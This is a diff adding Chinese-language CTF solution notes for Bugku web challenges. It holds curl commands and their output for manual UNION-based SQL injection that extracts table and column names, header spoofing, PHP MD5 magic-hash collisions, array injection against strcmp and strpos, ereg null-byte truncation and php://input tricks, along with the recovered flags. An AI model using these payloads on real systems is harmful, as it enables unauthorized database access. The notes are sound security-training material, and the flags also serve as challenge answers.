@@ -714,5 +714,327 @@ key is: KEY{0x0SIOPh550afc}
 
 
 ==================================
+你从哪里来
 ==================================
 curl --referer http://www.google.com http://120.24.86.145:9009/from.php
+
+D:\sqlmap\sqlmap-dev>curl -i -H "Referer: https://www.google.com" http://120.24.86.145:9009/from.php
+HTTP/1.1 200 OK
+Server: nginx
+Date: Mon, 30 Jul 2018 06:54:16 GMT
+Content-Type: text/html
+Transfer-Encoding: chunked
+Connection: keep-alive
+Keep-Alive: timeout=60
+
+flag{bug-ku_ai_admin}
+D:\sqlmap\sqlmap-dev>curl --referer http://www.google.com http://120.24.86.145:9009/from.php
+are you from google?
+D:\sqlmap\sqlmap-dev>curl --referer https://www.google.com http://120.24.86.145:9009/from.php
+flag{bug-ku_ai_admin}
+
+
+=================================
+成绩查询
+=================================
+http://120.24.86.145:8002/chengjidan/index.php
+
+id=1 or 1=1
+可以返回数据
+id=1 abcd
+也返回数据
+
+curl -i -F "id=' or 1=1 -- "  http://120.24.86.145:8002/chengjidan/index.php
+可以返回数据
+curl -i -F "id=' or 1=1  order by 1  -- "  http://120.24.86.145:8002/chengjidan/index.php
+返回不同行数据
+curl -i -F "id=' or 1=1  order by 5  -- "  http://120.24.86.145:8002/chengjidan/index.php
+不返回数据，说明 select 有 4 列
+
+id=1' union select 0，ascii(substr(database(),1,1)),9,9 order by 1 -- 
+curl -i -F "id=1' union select 0 , ascii(substr(database(),1,1)),ascii(substr(database(),2,1)),ascii(substr(database(),3,1)) order by 1 -- "  http://120.24.86.145:8002/chengjidan/index.php
+返回 115,107,99
+curl -i -F "id=1' union select 0 , ascii(substr(database(),4,1)),ascii(substr(database(),5,1)),ascii(substr(database(),6,1)) order by 1 -- "  http://120.24.86.145:8002/chengjidan/index.php
+返回  <td>116<td>102<td>95</tbody>
+curl -i -F "id=1' union select 0 , ascii(substr(database(),7,1)),ascii(substr(database(),8,1)),ascii(substr(database(),9,1)) order by 1 -- "  http://120.24.86.145:8002/chengjidan/index.php
+返回 <td>102<td>108<td>97</tbody>
+curl -i -F "id=1' union select 0 , ascii(substr(database(),10,1)),ascii(substr(database(),11,1)),ascii(substr(database(),12,1)) order by 1 -- "  http://120.24.86.145:8002/chengjidan/index.php
+返回  <td>103<td>0<td>0</tbody>
+
+用pyhton
+print(chr(115) + chr(107) + chr(99) + chr(116) + chr(102) + chr(95) + chr(102) + chr(108) + chr(97)+ chr(103))
+返回
+skctf_flag
+
+手工返回表名字
+1' union select 0,ascii(substr(select table_name from information_schema.tables where table_schema=database() limit 0,1)1,1)),9,9 order by 1 -- 
+curl -i -F "id=1' union select 0,ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)),9,9 order by 1 --  "  http://120.24.86.145:8002/chengjidan/index.php
+curl -i -F "id=1' union select 0,ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1)),9,9 order by 1 --  "  http://120.24.86.145:8002/chengjidan/index.php
+curl -i -F "id=1' union select 0,ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1)),9,9 order by 1 --  "  http://120.24.86.145:8002/chengjidan/index.php
+curl -i -F "id=1' union select 0,ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),4,1)),9,9 order by 1 --  "  http://120.24.86.145:8002/chengjidan/index.php
+curl -i -F "id=1' union select 0,ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),5,1)),9,9 order by 1 --  "  http://120.24.86.145:8002/chengjidan/index.php
+返回 102,108,52,103,0
+flg4
+
+手工返回列名
+(select column_name from information_schema.columns where table_name='fl4g' limit 0,1)
+1' union select 0, ascii(substr((select column_name from information_schema.columns where table_name='fl4g' limit 0,1),1,1)),9,9 order by 1 -- 
+curl -i -F "id=1' union select 0 ,ascii(substr((select column_name from information_schema.columns where table_name='fl4g' limit 0,1),1,1)),9,9 order by 1 --  "  http://120.24.86.145:8002/chengjidan/index.php
+curl -i -F "id=1' union select 0 ,ascii(substr((select column_name from information_schema.columns where table_name='fl4g' limit 0,1),2,1)),9,9 order by 1 --  "  http://120.24.86.145:8002/chengjidan/index.php
+curl -i -F "id=1' union select 0 ,ascii(substr((select column_name from information_schema.columns where table_name='fl4g' limit 0,1),3,1)),9,9 order by 1 --  "  http://120.24.86.145:8002/chengjidan/index.php
+curl -i -F "id=1' union select 0 ,ascii(substr((select column_name from information_schema.columns where table_name='fl4g' limit 0,1),4,1)),9,9 order by 1 --  "  http://120.24.86.145:8002/chengjidan/index.php
+curl -i -F "id=1' union select 0 ,ascii(substr((select column_name from information_schema.columns where table_name='fl4g' limit 0,1),5,1)),9,9 order by 1 --  "  http://120.24.86.145:8002/chengjidan/index.php
+..
+共 10字符
+115,107,99,116,102,95,102,108,97,103
+skctf_flag
+
+可以利用字段1 直接返回
+select skctf_flag from fl4g limit 0,1
+1' union select (select skctf_flag from fl4g limit 0,1),9,9,9 order by 1 -- 
+curl -i -F "id=1' union select (select skctf_flag from fl4g limit 0,1),9,9,9 order by 1 --  "  http://120.24.86.145:8002/chengjidan/index.php
+BUGKU{Sql_INJECT0N_4813drd8hz4}
+
+select GROUP_CONCAT()
+
+=================================
+备份是个好习惯
+=================================
+curl -i http://120.24.86.145:8002/web16/index.php.bak
+
+<?php
+/**
+ * Created by PhpStorm.
+ * User: Norse
+ * Date: 2017/8/6
+ * Time: 20:22
+*/
+
+include_once "flag.php";
+ini_set("display_errors", 0);
+$str = strstr($_SERVER['REQUEST_URI'], '?');
+$str = substr($str,1);
+$str = str_replace('key','',$str);
+parse_str($str);
+echo md5($key1);
+
+echo md5($key2);
+if(md5($key1) == md5($key2) && $key1 !== $key2){
+    echo $flag."取得flag";
+}
+?>
+
+parse_str 
+
+?key1=abcd&key2=1234
+使用URL encode
+?6bey1=abcd&%6bey2=1234
+curl -i "http://120.24.86.145:8002/web16/index.php?%6bey1=abc&%6bey2=123"
+使用php MD5漏洞
+md5('240610708')   == md5('QNKCDZO');
+md5('aabg7XSs')     == md5('aabC9RqS');
+
+?6bey1=240610708&%6bey2=QNKCDZO
+curl -i "http://120.24.86.145:8002/web16/index.php?%6bey1=aabg7XSs&%6bey2=aabC9RqS
+返回  
+Bugku{OH_YOU_FIND_MY_MOMY}取得flag
+
+
+===========================
+MD5冲突
+===========================
+http://120.24.86.145:9009/md5.php?a=aabC9RqS
+flag{md5_collision_is_easy}
+
+=================
+前女友(SKCTF)
+=================
+
+http://118.89.219.210:49162/code.txt
+
+<?php
+if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
+    $v1 = $_GET['v1'];
+    $v2 = $_GET['v2'];
+    $v3 = $_GET['v3'];
+    if($v1 != $v2 && md5($v1) == md5($v2)){
+        if(!strcmp($v3, $flag)){
+            echo $flag;
+        }
+    }
+}
+?>
+
+利用strcmp($str1, $str2) (Array injection)
+v1=aabg7XSs&v2=aabC9RqS&v3[]
+
+
+curl -i "http://118.89.219.210:49162/?v1=aabg7XSs&v2=aabC9RqS&v3\[\]"
+SKCTF{Php_1s_tH3_B3St_L4NgUag3}
+
+
+=====================
+web8
+=====================
+http://120.24.86.145:8002/web8/
+
+<?php
+extract($_GET);
+if (!empty($ac))
+{
+$f = trim(file_get_contents($fn));
+if ($ac === $f)
+{
+echo "<p>This is flag:" ." $flag</p>";
+}
+else
+{
+echo "<p>sorry!</p>";
+}
+}
+?>
+
+利用php封装协议
+php://input 读取post数据
+curl -i -d "hello" "http://120.24.86.145:8002/web8/?ac=hello&fn=php://input"
+flag{3cfb7a90fc0de31}
+
+======================
+程序员本地网站
+======================
+curl -i  -H "X-Forwarded-For: 127.0.0.1" "http://120.24.86.145:8002/localhost/"
+HTTP/1.1 200 OK
+Server: nginx
+Date: Tue, 31 Jul 2018 03:23:22 GMT
+Content-Type: text/html; charset=utf-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Keep-Alive: timeout=60
+
+flag{loc-al-h-o-st1}
+
+
+
+====================================
+web5
+====================================
+使用jsfuck
+在chrome控制台执行
+ctf{whatfk}
+
+
+======================
+strcmp比较字符串
+======================
+curl -i "http://120.24.86.145:9009/6.php?a\[\]="
+HTTP/1.1 200 OK
+Server: nginx
+Date: Tue, 31 Jul 2018 04:55:00 GMT
+Content-Type: text/html
+Transfer-Encoding: chunked
+Connection: keep-alive
+Keep-Alive: timeout=60
+
+Flag: flag{bugku_dmsj_912k}
+
+
+
+=======================
+extract变量覆盖
+=======================
+curl -i "http://120.24.86.145:9009/1.php?shiyan=&flag=1"
+HTTP/1.1 200 OK
+Server: nginx
+Date: Tue, 31 Jul 2018 05:01:27 GMT
+Content-Type: text/html
+Transfer-Encoding: chunked
+Connection: keep-alive
+Keep-Alive: timeout=60
+
+flag{bugku-dmsj-p2sm3N}
+
+===========================
+  十六进制与数字比较
+===========================
+http://120.24.86.145:9009/20.php
+password=0xdeadc0de
+
+http://120.24.86.145:9009/20.php?password=0xdeadc0de
+flag{Bugku-admin-ctfdaimash}
+
+======================
+strpos数组绕过
+======================
+http://120.24.86.145:9009/15.php
+ctf[]=
+
+curl -i http://120.24.86.145:9009/15.php?ctf[]=
+ flag{Bugku-D-M-S-J572}
+
+ =====================
+ 数组返回NULL绕过
+ =====================
+ http://120.24.86.145:9009/19.php
+ password[]=
+curl -i  http://120.24.86.145:9009/19.php?password[]=
+也可用ereg %00截断
+curl -i  http://120.24.86.145:9009/19.php?password=1%00--
+ flag{ctf-bugku-ad-2131212}
+
+ ========================
+ ereg正则%00截断
+ ========================
+ http://120.24.86.145:9009/5.php
+
+http://120.24.86.145:9009/5.php
+<?php
+$flag = "xxx";
+if (isset ($_GET['password']))
+{
+if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
+{
+echo '
+
+You password must be alphanumeric
+
+';
+}
+else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)
+{
+if (strpos ($_GET['password'], '-') !== FALSE) //strpos — 查找字符串首次出现的位置
+{
+die('Flag: ' . $flag);
+}
+else
+{
+echo('
+- have not been found
+
+');
+}
+}
+else
+{
+echo '
+Invalid password
+
+';
+}
+}
+?> 
+
+****************
+password=1e9%00-
+****************
+http://120.24.86.145:9009/5.php?password=1e9%00*-*
+
+curl -i http://120.24.86.145:9009/5.php?password=1e9%00*-*
+HTTP/1.1 200 OK
+Server: nginx
+Date: Tue, 31 Jul 2018 09:36:56 GMT
+Content-Type: text/html
+Transfer-Encoding: chunked
+Connection: keep-alive
+Keep-Alive: timeout=60
+
+Flag: flag{bugku-dm-sj-a12JH8}
